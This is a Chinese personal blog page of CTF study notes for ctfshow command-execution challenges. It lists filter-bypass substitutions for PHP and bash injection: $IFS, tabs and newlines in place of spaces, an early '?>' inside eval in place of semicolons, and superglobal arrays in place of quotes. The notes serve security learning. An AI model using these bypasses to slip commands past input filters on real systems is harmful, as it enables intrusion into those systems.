  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hack/ctfshow/web入门/命令执行/常见过滤替换收录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2024-10-01T03:59:00.000Z" itemprop="datePublished">2024-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/">常见过滤替换收录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="空格，用于分隔未结束"><a href="#空格，用于分隔未结束" class="headerlink" title="空格，用于分隔未结束"></a>空格，用于分隔未结束</h1><ul>
<li>php<ul>
<li>%09(tab)</li>
<li>%0a(换行符)，bash里面按下回车就是执行命令，但是php需要以分号作为语句的结束，可以起到分隔的作用</li>
<li>超全局数组上传绕过，include$_GET是不需要分隔符的，由于可以识别到变量美刀符号的存在，所以也可以叫$分隔吧</li>
</ul>
</li>
<li>bash<ul>
<li>%09(tab)</li>
<li>$IFS</li>
<li>${IFS}</li>
<li>&lt;&gt;</li>
<li>&lt;</li>
</ul>
</li>
</ul>
<h1 id="分号，用于结束语句"><a href="#分号，用于结束语句" class="headerlink" title="分号，用于结束语句"></a>分号，用于结束语句</h1><ul>
<li><p>php</p>
<ul>
<li>?&gt; 提前闭合了文件，值得一提的就是，eval(‘?&gt;’)这样子是有效的，也就是和本身的文件的&lt;?形成了闭合，说明eval执行的php代码可以看作嵌入了源码，图例的由于是php的终端，只能在eval内部体现了?&gt;确实造成了提前闭合  <img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/Clip_2024-09-25_15-17-57.png" class="" title="Clip_2024-09-25_15-17-57.png"></li>
<li>;</li>
</ul>
</li>
<li><p>bash</p>
<ul>
<li>%0a(换行符)</li>
</ul>
</li>
</ul>
<h1 id="单双引号"><a href="#单双引号" class="headerlink" title="单双引号"></a>单双引号</h1><ul>
<li>php<ul>
<li>使用超全局数组，新建一个键再上传，超全家数组的返回结果本身就是字符串</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/" data-id="cm1pwtvw4000necvhfkcufrqw" data-title="常见过滤替换收录" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/">hack</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/ctfshow/">ctfshow</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li></ul></li></ul></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/">ctfshow-web入门系列-命令执行-web37-web44</a>
          </li>
        
          <li>
            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/">ctfshow-web入门系列-命令执行-web29-web36</a>
          </li>
        
          <li>
            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/">命令执行，命令执行的文件包含必看文章</a>
          </li>
        
          <li>
            <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2%E6%94%B6%E5%BD%95/">常见过滤替换收录</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>